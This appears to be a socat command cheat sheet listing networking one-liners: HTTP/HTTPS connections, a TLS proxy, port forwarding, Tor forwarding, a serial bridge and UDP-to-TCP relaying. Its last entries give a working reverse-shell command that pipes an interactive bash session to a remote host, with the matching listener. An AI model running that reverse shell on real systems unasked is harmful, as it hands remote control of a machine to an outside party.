---
tags: [ networking ]
---
# socat connect to http-server (port 80 on 'butzel.info')
socat TCP4:butzel.info:80 -

# connect to https-server (port 443 on 'butzel.info' with tls)
socat openssl:butzel.info:443 -

# tcp-listener (port 3180), output as hexdump (-x) and fork for new connetions
socat -x tcp-listen:3180,fork -

# practical examples:

# complete real working http-example:  
#  (sleep is necessary to prevent socat closing socket before data received)
(echo -e "GET / HTTP/1.1\r\nHost: butzel.info\r\n\r" && sleep 1) \ 
| socat tcp4:butzel.info:80 -

# http to httpS 'Proxy' (for an webserver without TLS-Support)
socat OPENSSL-LISTEN:443,reuseaddr,pf=ip4,fork,cert=server.pem,cafile=client.crt,verify=0 TCP4-CONNECT:127.0.0.1:80

# port forwarding (e.g. own port 3180 to port 22(ssh) on target
socat TCP4-LISTEN:3180,reuseaddr,fork TCP4:butzel.info:ssh

# TOR-forwarding (needs tor-daemon on port 9050 running)
socat tcp4-listen:8080,reuseaddr,fork socks4A:127.0.0.1:t0rhidd3ns3rvice.onion:80,socksport=9050

# network (port 8266) to serial bridge (/dev/ttyUSB0 baudrate: 115200)
socat TCP4-LISTEN:8266,fork,reuseaddr /dev/ttyUSB0,raw,crnl,b115200

# udp to tcp
socat -u udp-recvfrom:1234,fork tcp:localhost:4321

# reverse shell:
socat exec:'bash -i',pty,stderr tcp:remote.butzel.info:3180

# listener for above reverse shell (on remote.butzel.info):
socat file:`tty`,raw,echo=0 tcp-listen:3180
# or: nc -lp 3180
